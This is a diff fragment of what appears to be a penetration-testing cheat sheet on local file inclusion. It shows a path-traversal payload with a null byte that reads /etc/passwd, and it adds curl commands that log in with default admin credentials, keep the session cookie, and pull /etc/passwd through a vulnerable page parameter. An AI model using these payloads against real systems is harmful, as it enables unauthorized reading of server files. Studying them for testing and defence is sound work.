@@ -46,6 +46,16 @@ Check if a folder exists, go into it and the go out.
 index.php?page=../../../../../../var/www/dossierexistant/../../../../../etc/passwd%00"
 ```
 
+**Download config-files in a nice style-format**
+If you read files straight in the browser the styling can becomes unbearable. Really difficult to read. A way around it is to download the files from the terminal. But that won't work if there is a login that is blocking it. So this is a great workaround:
+
+```
+# First we save the cookie
+curl -s http://example.com/login.php -c cookiefile -d "user=admin&pass=admin"
+curl -s http://example.com/gallery.php?page=/etc/passwd -b cookiefile
+```
+
+
 ### Sensitive file
 
 This is the default layout of important apache files.
